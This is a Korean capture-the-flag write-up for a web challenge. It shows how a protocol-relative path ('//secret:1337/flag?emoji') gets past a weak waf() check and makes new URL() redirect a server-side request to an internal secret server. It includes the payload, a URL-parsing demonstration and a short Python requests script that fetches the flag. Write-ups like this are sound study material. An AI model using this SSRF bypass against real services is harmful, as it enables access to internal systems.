# Category

web

# Overview

:pizza: -> 🍕

# Analysis

서버의 구성은 `frontend`, `backend`, `secret` 3개의 서버로 구성되어 있으며, `secret` 서버에서 GET `/flag` 요청 시 flag를 반환한다.

1. `index.html`에서 입력한 값을 `frontend` `express`서버로 `"/api?path=/emoji/" + encodeURIComponent(text)`와 같이 전달한다.

2. 전달받은 `frontend` `express`서버는 `waf()`함수를 통해 전달받은 `path`값이 문자열, `/` 시작, `emoji`글자의 포함 여부를 검사하여 필터링한다.

3. `new URL(path, "http://backend:3000")`을 통해 생성된 url인 `backend` `express`에서 이모지 정보를 가져오게 되는데, `new URL()`의 경우 path 대신 다른 url이 입력되게 된다면 입력된 url로 덮어씌워진다.

# Exploitation

`new URL()`의 url 생성을 이용하여 `http://secret:1337/flag`로 url을 변경하여 flag를 획득할 수 있다.

1. `index.html`의 스크립트에 고정되어있는 `"/api?path=/emoji/" + encodeURIComponent(text)`부분을 `"/api?path=encodeURIComponent(text)"`와 같이 입력값에 따라 전달하게 변경한다.

2. `//secret:1337/flag?emoji` 입력값을 전달하게 된다면, `frontend` `express`의 `waf()`함수에 대한 조건인 `/` 시작, 문자열, emoji가 포함되어 통과할 수 있다.
   - `new URL()` 생성과정에서 앞에 파라미터에 Protocol-Relative URL인 `//`를 통해 `http://`와 같은 결과를 사용할 수 있다.

   ```js
   // new URL("//foo.com", "https://example.com"); // => 'https://foo.com' (see relative URLs)

   new URL("//secret:1337/flag?emoji", "http://backend:3000")
   URL {
     href: 'http://secret:1337/flag?emoji',
     origin: 'http://secret:1337',
     protocol: 'http:',
     username: '',
     password: '',
     host: 'secret:1337',
     hostname: 'secret',
     port: '1337',
     pathname: '/flag',
     search: '?emoji',
     searchParams: URLSearchParams { 'emoji' => '' },
     hash: ''
   }
   ```

   - `http://secret:1337/flag`를 조회할 때 `?emoji`의 값은 전달하여도 사용되지 않기 때문에 `waf()` 함수 통과를 위해 입력한다.

이렇게 정리된 `//secret:1337/flag?emoji`을 입력하게되면 다음 flag가 반환된다.

```py
from requests import request as req

path = "//secret:1337/flag?emoji"

res = req(
    url="http://34.170.146.252:61178/api?path=" + path,
    method="GET",
)

print(res.text)
```

# Flag

`Alpaca{Su...ag}`
